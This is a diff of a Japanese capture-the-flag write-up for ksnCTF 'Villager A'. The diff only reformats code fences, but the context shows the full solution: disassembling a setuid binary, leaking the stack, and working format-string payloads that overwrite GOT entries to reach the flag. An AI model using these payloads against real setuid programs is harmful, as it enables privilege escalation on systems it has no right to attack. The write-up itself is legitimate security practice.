@@ -8,7 +8,7 @@ category:
 # ksnCTF Villager A
 
  - sshで接続してみる
-```bash=
+```bash
 $ ssh -p 10022 q4@ctfq.sweetduet.info
 q4@ctfq.sweetduet.info's password: 
 Last login: Wed Mar 13 13:43:28 2019 from 10.0.2.2
@@ -20,7 +20,7 @@ total 16
 ```
  - flag.txtというファイルがあるので開きたい
 
-```bash=
+```bash
 [q4@localhost ~]$ cat flag.txt 
 cat: flag.txt: Permission denied
 [q4@localhost ~]$ chmod 755 flag.txt 
@@ -34,7 +34,7 @@ q4
  - 自分の名前は`q4`なので, `q4a`は使えない
  - q4というファイルのパーミッションは`-rwsr-xr-x`なので, `q4a`と異なるグループに属しているユーザでも実行はできそう
 
-```bash=
+```bash
 [q4@localhost ~]$ ./q4
 What's your name?
 q4
@@ -53,7 +53,7 @@ I see. Good bye.
 
  - noを言うまで問うのをやめてくれない
  - `objdump`で確認する
-```bash=
+```bash
 $ objdump -d -M intel ./q4
 ~~ 略 ~~~
 080485b4 <main>:
@@ -143,7 +143,7 @@ $ objdump -d -M intel ./q4
      - fopen
      - puts
  - fgetsを使用しているのでbofかformat stringを狙える気がする
-```bash=
+```bash
 [q4@localhost ~]$ ./q4
 What's your name?
 AAAAAAAAAAAAAAAAAAAAAa
@@ -165,7 +165,7 @@ Hi, AAAA,0x400,0x9258c0,0x8,0x14,0xc84fc4,0x41414141,0x2c70252c,0x252c7025,0x702
  - できなさそう(system関数の番地がわからない)
  - 使えそうな関数を探す
  - 
- ```bash=
+ ```bash
  [q4@localhost ~]$ objdump -d -M intel -j .plt ./q4 
 
 ./q4:     file format elf32-i386
@@ -243,13 +243,13 @@ Disassembly of section .plt:
 |%28180x|28180|67588|67588(0x0804)-39408=28180|
 |%7$n|0|67588|次は7個目|
 
-```bash=
+```bash
 echo -e '\xf0\x99\x04\x08\xf2\x99\x04\x08%39400x%6$hn%28180x%7$hn' | ./q4
 ```
 
  - 通らない
  - printf(0x80499f0)の代わりにputchar(0x80499e0)を使ってみる
-```bash=
+```bash
 [q4@localhost ~]$ echo -e '\xe0\x99\x04\x08\xe2\x99\x04\x08%39400x%6$hn%28180x%7$hn' | ./q4
 ~~ 略 ~~~
 Segmentation Fault
@@ -257,7 +257,7 @@ Segmentation Fault
 ```
 
  - gdbで原因を探る
-```bash=
+```bash
 [q4@localhost ~]$ echo -e 'r\n\xe0\x99\x04\x08\xe2\x99\x04\x08%39400x%6$hn%28180x%7$hn' | gdb -q ./q4
 Reading symbols from /home/q4/q4...(no debugging symbols found)...done.
 (gdb) Hangup detected on fd 0
@@ -281,7 +281,7 @@ error detected on stdin
 |%7$n|0|67588|次は7個目|
 
  - コマンドは次の通り
-```bash=
+```bash
 $ echo -e '\xf0\x99\x04\x08\xf2\x99\x04\x08%34441x%6$hn%33139x%7$hn' | ./q4
 ~~ 略 ~~~
 Do you want the flag?
@@ -289,7 +289,7 @@ Do you want the flag?
 
  - 通らない...
  - 一応putcharも試す
-```bash=
+```bash
 $ echo -e '\xe0\x99\x04\x08\xe2\x99\x04\x08%34441x%6$hn%33139x%7$hn' | ./q4
 ~~ 略 ~~~
 FLAG_~~~ 略 ~~~
